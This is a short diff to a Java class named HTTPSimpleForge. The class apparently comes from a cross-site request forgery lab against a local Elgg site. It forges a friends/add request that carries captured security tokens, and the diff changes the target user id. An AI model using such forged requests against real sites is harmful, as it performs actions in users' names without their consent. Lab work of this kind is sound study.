@@ -19,7 +19,7 @@ public class HTTPSimpleForge {
 			String requestDetails = String.format("&__elgg_ts=%s&__elgg_token=%s", elggTs, elggToken);
 
 			// URL to be forged.
-			URL url = new URL ("http://localhost:8082/action/friends/add?friend=39"+requestDetails);
+			URL url = new URL ("http://localhost:8082/action/friends/add?friend=40"+requestDetails);
 			System.out.println(url);
 
 			// URLConnection instance is created to further parameterize a
